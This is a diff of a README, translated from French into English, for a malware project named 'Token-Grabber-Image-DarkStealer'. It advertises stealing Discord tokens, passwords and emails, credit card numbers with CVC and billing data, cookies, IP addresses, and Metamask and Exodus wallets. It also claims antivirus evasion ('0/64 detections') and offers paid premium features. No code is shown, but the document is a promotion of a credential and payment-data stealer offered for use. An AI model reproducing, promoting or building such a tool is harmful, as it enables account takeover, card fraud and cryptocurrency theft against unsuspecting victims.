@@ -1,56 +1,52 @@
 # Token-Grabber-Image-DarkStealer
-Token Grabber Image DarkStealer
-
-Fonctionnalités
-
-QRCenregistreur de données
+QRCode logger
 
 Discord Login Stealer
 
-Nom d’utilisateur
+Username
 
 ID
 
-Jeton
+Token
 
-Mot de passe (même lorsqu’il change)
+Password (even when it changes)
 
-Messagerie électronique
+Email
 
 Badges
 
 Nitro
 
-Numéro de carte de crédit
+Credit Card number
 
-CVC (en anglais seulement)
+CVC
 
 Expiration
 
-Facturation
+Billing
 
 IP
 
-Nom d’hôte de l’ordinateur
+Computer Hostname
 
-Déconnectez-vous instantanément
+Instantly logout
 
-Désactiver QR
+Disable QR
 
-Intégration personnalisée
+Custom embed
 
-Structure de code cool
+Cool code structure
 
-Témoins (💎)
+Cookies (💎)
 
-Mot de passe (💎)
+Password (💎)
 
-Enregistreur automatique de cookies (💎)
+Cookie Automatic Logger (💎)
 
-Voleur de métamasque (💎)
+Metamask stealer (💎)
 
 Exodus stealer (💎)
 
 Anti-Delete & Anti-Spam (💎)
 
-0/64 détections (💎)
+0/64 Detections (💎)
